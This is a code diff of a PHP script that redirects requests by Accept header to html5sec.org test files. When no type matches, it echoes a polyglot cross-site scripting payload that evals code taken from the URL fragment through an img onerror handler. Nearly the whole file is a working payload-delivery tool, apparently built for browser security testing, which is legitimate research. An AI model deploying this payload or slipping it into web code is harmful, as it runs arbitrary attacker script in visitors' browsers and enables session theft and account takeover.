@@ -1,16 +1,19 @@
 <?php
+
 header("Access-Control-Allow-Origin: *");
 $urls = array(
-    "image/*" => "//html5sec.org/test.svg",
+    "text/css" => "//html5sec.org/test.css",
+    "image/*" => "//html5sec.org/test.svg", // Chrome sends */* for images - thus won't catch the SVG
+    "image/png" => "//html5sec.org/test.svg",
     "image/svg" => "//html5sec.org/test.svg",
     "image/gif" => "//html5sec.org/test.gif",
-    "application/xml" => "//htmlsec.org/test.xml",
     "application/zip" => "//html5sec.org/test.jar",
     "application/x-compressed" => "//html5sec.org/test.jar",
-    "application/java-archivemime-type" =>  "//html5sec.org/test.jar",
+    "application/x-shockwave-flash" => "//html5sec.org/test.swf", // unlikely to work given that all Flash Players send */*
+    "application/java-archivemime-type" => "//html5sec.org/test.jar",
     "application/atom+xml" => "//html5sec.org/rss",
-
 );
+
 function parse_accept($header) {
     $media_ranges = explode(",", $header);
     $sorted = array();
@@ -26,6 +29,7 @@ function parse_accept($header) {
     return $sorted;
 
 }
+
 if (isset($_SERVER['HTTP_ACCEPT'])) {
     $h = parse_accept($_SERVER['HTTP_ACCEPT']);
     foreach ($h as $entry) {
@@ -35,8 +39,11 @@ if (isset($_SERVER['HTTP_ACCEPT'])) {
             header("Location: $urls[$type]");
             exit();
         }
-        
     }
 }
-// if type not found or no accept header sent..
-?>if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}//<img src="x:x" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert('XSS')}">
+
+echo '\'\';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(\'XSS\')}//<img src="xxx://" onerror="if(location.hash){eval(location.hash.slice(1))}else{alert(\'XSS\')}">
+msgbox+1';
+
+exit();
+?>
